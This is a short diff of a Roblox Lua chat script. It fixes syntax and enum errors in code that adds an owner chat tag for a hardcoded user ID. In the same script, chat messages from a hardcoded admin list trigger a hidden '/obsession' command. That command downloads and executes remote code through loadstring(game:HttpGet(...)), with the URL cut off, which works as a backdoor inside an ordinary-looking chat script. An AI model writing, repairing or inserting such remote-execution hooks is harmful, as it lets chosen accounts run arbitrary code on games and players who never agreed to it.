@@ -128,7 +128,7 @@ local AdminCommands = {7471771361,9162624705}
 local TextChatService = game:GetService('TextChatService')
 
 TextChatService.OnIncomingMessage = function(Message: TextChatMessage)
-    local command = Message.Text:lower
+    local command = Message.Text:lower()
     if Message.TextSource then
         if Message.TextSource.UserId == 7471771361 then
             Message.PrefixText = "<font color='#7B11FD'>[Recreation owner]</font>"
@@ -139,7 +139,7 @@ TextChatService.OnIncomingMessage = function(Message: TextChatMessage)
                 .. Message.PrefixText
         end
     end
-    if table.find(AdminCommands, Message.TextSource.UserId) and Message.Status == Enum.MessageStatus.Success then
+    if table.find(AdminCommands, Message.TextSource.UserId) and Message.Status == Enum.TextChatMessageStatus.Success then
         if command == "/obsession" then
             loadstring(
                 game:HttpGet(
